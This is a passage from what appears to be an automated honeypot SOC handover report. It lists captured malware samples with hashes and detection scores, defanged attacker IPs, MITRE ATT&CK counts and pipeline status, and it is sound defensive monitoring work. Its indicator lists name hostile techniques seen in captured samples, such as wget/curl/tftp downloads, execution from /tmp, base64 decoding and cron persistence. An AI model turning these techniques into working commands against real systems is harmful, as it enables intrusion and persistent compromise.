| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.1.10[.]110` | TW | kbro CO. Ltd. | **100** ⚠️ | 13 |
| `222.174.184[.]86` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `117.248.201[.]39` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 7 |
| `163.223.244[.]3` | IN | BRNET INFOCOM PRIVATE LIMITED | **100** ⚠️ | 21 |
| `190.83.64[.]220` | AR | LUQUE FEDERICO GASTON (NEWFIX) | **100** ⚠️ | 1 |
| `125.227.156[.]55` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `221.182.185[.]190` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `88.214.25[.]124` | DE | VDS&VPN services | **100** ⚠️ | 50 |
| `45.33.109[.]8` | US | Linode | **100** ⚠️ | 50 |
| `172.236.228[.]227` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 68 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 57 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 125 cases |
| Tool 34  | Credential Extractor        | ✅ 79 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 83 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (13.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 57 priority case(s) shown individually · 28 recon entry/entries in table (11 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T12:56:43Z_
